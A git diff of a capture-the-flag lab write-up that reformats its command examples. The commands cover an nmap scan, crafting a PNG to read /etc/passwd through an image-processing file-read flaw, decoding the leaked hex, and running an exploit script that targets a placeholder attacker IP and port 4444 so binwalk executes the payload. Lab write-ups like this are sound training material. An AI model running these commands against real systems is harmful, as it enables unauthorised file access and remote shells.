@@ -6,7 +6,9 @@ Linux . Easy
 ### Initial Nmap Scan
 Our first step in probing the web application was an initial Nmap scan using the following command:
 
-`nmap -sCV -p- {machine IP}`
+```
+nmap -sCV -p- {machine IP}
+```
 
 ![image](https://github.com/vsang181/Hackthebox/assets/28651683/2cd104de-7e65-4a71-be92-adf4ce9070a3)
 
@@ -64,21 +66,26 @@ Following a quick Google search, we discovered an Arbitrary File Read vulnerabil
 
 Taking advantage of the vulnerability we discovered, we first generated a blank .png file designed to read the "/etc/passwd" file. This was achieved using the following command:
 
-`python3 generate.py -f "/etc/passwd" -o exploit.png`
+```
+python3 generate.py -f "/etc/passwd" -o exploit.png
+```
 
 This malicious .png file was then uploaded to the web application and the shrunken image resulting from the server's processing was saved locally for further analysis.
 
 To extract the hexadecimal content embedded in the manipulated image, we utilized the command-line tool 'identify' with the following command:
 
-`identify -verbose {filename.png}`
-
+```
+identify -verbose {filename.png}
+```
 This yielded the target hexadecimal code.
 
 ![image](https://github.com/vsang181/Hackthebox/assets/28651683/c3f759a8-d888-440f-b2d0-c93afa4730de)
 
 The hexadecimal code was then converted into a string format using the following Python command:
 
-`python3 -c 'print(bytes.fromhex("{Hex Code}").decode("utf-8"))'`
+```
+python3 -c 'print(bytes.fromhex("{Hex Code}").decode("utf-8"))'
+```
 
 The decoded string revealed the presence of a user named Emily in the system.
 
@@ -128,7 +135,9 @@ The exploit code was saved into a file, named, for instance, 'exploit.py'.
 
 The exploit was launched using the following command:
 
-`python3 exploit.py /path/to/input.png your.ip.address.here 4444`
+```
+python3 exploit.py /path/to/input.png your.ip.address.here 4444
+```
 
 This operation created a png file ready to be uploaded and subsequently executed by 'binwalk', as identified earlier in the 'malwarescan.sh' script.
 
